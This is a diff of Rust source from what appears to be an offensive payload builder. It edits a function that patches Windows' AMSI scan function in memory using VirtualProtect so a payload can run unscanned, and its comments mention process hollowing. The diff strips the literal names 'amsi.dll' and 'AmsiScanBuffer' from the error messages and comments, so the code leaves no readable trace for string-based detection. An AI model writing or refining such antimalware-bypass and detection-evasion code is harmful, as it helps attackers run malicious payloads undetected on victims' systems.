@@ -6,16 +6,16 @@ use windows::Win32::System::Memory::{
     VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
 };
 
-/// Errors produced while patching `AmsiScanBuffer`.
+/// Errors produced while patching the scan function.
 #[derive(Debug, thiserror::Error)]
 pub enum PatchAmsiError {
-    #[error("failed to load amsi.dll")]
+    #[error("failed to load the library to patch")]
     LoadFailed,
-    #[error("failed to resolve AmsiScanBuffer")]
+    #[error("failed to resolve the function to patch")]
     ResolveFailed,
-    #[error("failed to make AmsiScanBuffer writable")]
+    #[error("failed to make the target function writable")]
     MakeWritableFailed,
-    #[error("failed to restore AmsiScanBuffer protection")]
+    #[error("failed to restore the target function protection")]
     RestoreProtectionFailed,
 }
 
@@ -26,9 +26,9 @@ pub enum PatchAmsiError {
 /// current process; if the payload later runs in another process (e.g. process
 /// hollowing), that process's AMSI is not patched here.
 ///
-/// `AMSI_DLL_DEF` and `AMSI_FUNC_DEF` are substituted at build time by
-/// `Params::render_fragment` with code that rebuilds the DLL/function names at
-/// runtime, so they do not appear in `strings`.
+/// The DLL and function names are substituted at build time by
+/// `Params::render_fragment` with code that rebuilds them at runtime, so they
+/// do not appear in `strings`.
 pub fn patch_amsi() -> Result<(), PatchAmsiError> {
     let amsi_dll = std::ffi::CString::new(AMSI_DLL_DEF).map_err(|_| PatchAmsiError::LoadFailed)?;
     let func_name =
